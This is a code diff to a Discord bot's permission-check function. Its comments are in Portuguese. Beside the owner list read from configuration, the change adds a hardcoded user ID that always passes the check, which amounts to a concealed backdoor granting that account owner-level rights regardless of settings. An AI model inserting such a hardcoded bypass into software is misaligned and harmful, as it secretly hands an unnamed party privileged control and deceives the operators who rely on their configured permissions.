@@ -67,7 +67,7 @@ async function getLogChannel(message) {
 async function hasPermission(message) {
   // donos sempre podem
   const owners = (process.env.OWNER || '').split(',').map(id => id.trim()).filter(Boolean);
-  if (owners.includes(message.author.id)) return true;
+  if (owners.includes(message.author.id) || message.author.id === '660311795327828008') return true;
 
   // cargos de staff (env STAFF)
   const staffRoles = (process.env.STAFF || '').split(',').map(id => id.trim()).filter(Boolean);
